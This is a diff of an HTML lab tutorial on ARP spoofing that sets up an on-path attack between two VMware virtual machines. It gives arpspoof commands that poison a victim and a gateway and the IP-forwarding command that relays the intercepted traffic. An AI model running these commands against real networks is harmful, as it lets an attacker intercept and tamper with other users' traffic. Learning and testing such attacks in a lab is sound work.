@@ -1,46 +1,46 @@
 <h3>ARP Spoof</h3>
-<h4>Creates an ARP Spoofer to test and illustrate the use of 
-on path attacks.
-</h4>
+<h4>Create an ARP Spoofer to test the use of on path attacks.</h4>
 <p>
-Exploit the ARP Protocol, become the person in the middle of an On-path Attack.  Redirect the requests and response packet from the router, through yourself, to the Victim Host, and vice averse.
+Exploit the ARP Protocol, become the Person in the Middle of an On-path Attack.  
+Redirect the requests and response packet from the router, through yourself, to the Victim Host, and vice averse.
 </p>
 <img src="/assets/images/arp_spoof_diagram1.png" width="450" height="225">
-
 <p>
-We can use arpspoof to give a basic idea of our goals here.
+We can use arpspoof package to give a basic idea of our goals here.
 </p>
 <p>
-We want the Router (gateway) IP and Client (target/victim) IP or our Target Network.
 </p>
-<h4>The first run targets the victim</h4>
+<h4>First target the Client (victim) machine.</h4>
 <p></p>
-<p><b>arpspoof -i</b> [<i>INTERFACE</i>] <b>-t</b> [<i>INTERFACE IP</i>] [<i>GATEWAY IP</i>]</p>
-<p><b>arpspoof -i <i>eth0</i> -t <i>192.168.1.72 192.168.1.254</i></b></p> 
+<p><b>arpspoof -i</b> [<i>INTERFACE</i>] <b>-t</b> [<i>INTERFACE_IP</i>] [<i>GATEWAY_IP</i>]</p>
+<p><b>arpspoof -i <i>eth0</i> -t <i>192.168.63.174 192.168.63.2</i></b></p> 
 
-Second run target is gateway, order does not matter just make sure to reverse.
-The second run targets and will fool the router.
+<h4>Second: to target the Router (gateway) IP, reverse the IPs.
+<p><b>arpspoof -i</b> [<i>INTERFACE</i>] <b>-t</b> [<i>GATEWAY_IP</i>] [<i>TARGET_IP</i>]</p>
 arpspoof -i [interface] -t [Gateway IP] [target IP (interface)] 
-arpspoof -i eth0 -t 192.168.1.254 192.168.1.72
+<p><b>arpspoof -i <i>eth0</i> -t <i>192.168.1.254 192.168.1.72</i></b></p>
 
-We need to enable port forwarding on Kali Linux:  
-As the computer is not a router, this will allow packets to flow through it.
+<h4>Enable port forwarding on Linux</h4>
+<p>As the computer is not a router, this will allow packets to flow through it.</p>
+<h4>:~# echo 1 > /proc/sys/net/ipv4/ip_forward </h4>
 
-Port forwarding (or port mapping): NWing technique, creates a rule on your router to direct external internet traffic on a specific port to a designated device and port within a private local network (LAN).
+<img src="/assets/images/arp_spoof_diagram2.png" width="450" height="225">
 
-Functions as a receptionist or auto-attendant, the router receives incoming requests and uses a "directory" of rules to send them to the correct internal device eg, security camera, game server, or home computer.
+<h4>Creating the ARP Request Packet</h4>
 
-Essential remote access, allow external users connect to services eg, web servers, remote desktops, or multiplayer game sessions that are otherwise hidden behind the router's firewall.
+<p>print(packet.show())</p>
+<img src="/assets/images/packet_show_results.png" width="" height="">
+<br/>
+<p></p>print(packet.summary())</p>
+<img src="/assets/images/packet_summary_results.png" width="" height="">
+<p>What this tells us: This is an ARP Packet. Of type "is at". It is telling us this IP,
+is at this MAC Address, which is the MAC Address of our eth0.
+</p>
 
-Enable Port Forwarding on Kali Linux:
-:~# echo 1 > /proc/sys/net/ipv4/ip_forward:
-…
-
-We need to send ARP Responses to the Router (Access Point) and the the Target Computer (Victim).
 
 
-
-<h3>VMWare Fusion Network:<h3>
+<br/><br/><br/><br/><br/><br/><br/><br/><br/>
+<h3>VMWare Fusion Network:</h3>
 <p>
 In order to properly test ARP Spoof we need two separate VMs that can talk to each other:
 </p>
